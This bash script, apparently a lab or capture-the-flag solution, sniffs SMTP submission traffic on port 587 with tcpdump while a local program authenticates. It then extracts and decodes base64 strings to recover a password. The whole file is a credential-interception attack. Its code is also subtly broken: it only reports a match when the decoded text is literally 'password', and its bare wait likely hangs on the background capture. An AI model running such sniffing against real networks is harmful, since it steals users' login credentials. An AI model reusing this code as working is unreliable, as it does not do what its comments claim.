#!/bin/bash
# This script runs tcpdump to capture network traffic on port 587
# and filters out the base64 encoded strings that contain the password

# Check if tcpdump is installed
if ! command -v tcpdump &> /dev/null
then
    echo "tcpdump is not installed. Please install it first."
    exit 1
fi

# Check if user_authenticating_into_server is executable
if [ ! -x user_authenticating_into_server ]
then
    echo "user_authenticating_into_server is not executable. Please make it executable first."
    exit 2
fi

# Run tcpdump in the background and save the output to a file
tcpdump -i any port 587 -w capture.pcap &
# Get the process ID of tcpdump
PID=$!

# Run user_authenticating_into_server in another terminal
gnome-terminal -- user_authenticating_into_server

# Wait for user_authenticating_into_server to finish
wait

# Kill tcpdump
kill $PID

# Read the pcap file and extract the base64 encoded strings
strings capture.pcap | grep -E '^[A-Za-z0-9+/=]+$' > base64.txt

# Decode the base64 strings and look for the password
while read line
do
    decoded=$(echo "$line" | base64 --decode)
    if [[ $decoded == "password" ]]
    then
        echo "The password is: $decoded"
        break
    fi
done < base64.txt

# Remove the temporary files
rm capture.pcap base64.txt
